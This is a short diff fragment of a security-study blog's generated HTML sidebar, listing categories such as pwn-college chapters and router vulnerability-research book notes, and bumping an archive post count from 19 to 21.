href="/categories/pwn-college/Chapter01-Program-interaction/">Chapter01 Program interaction</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter02-Binary-file/">Chapter02 Binary file</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Introduciton/">Introduciton</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">18</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -1312,7 +1299,7 @@ PIE:      No PIE (0x400000)
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年05月</a><span class="archive-list-count">19</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">73</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年05月</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">73</span></li></ul>
     </div>
   </div>
 
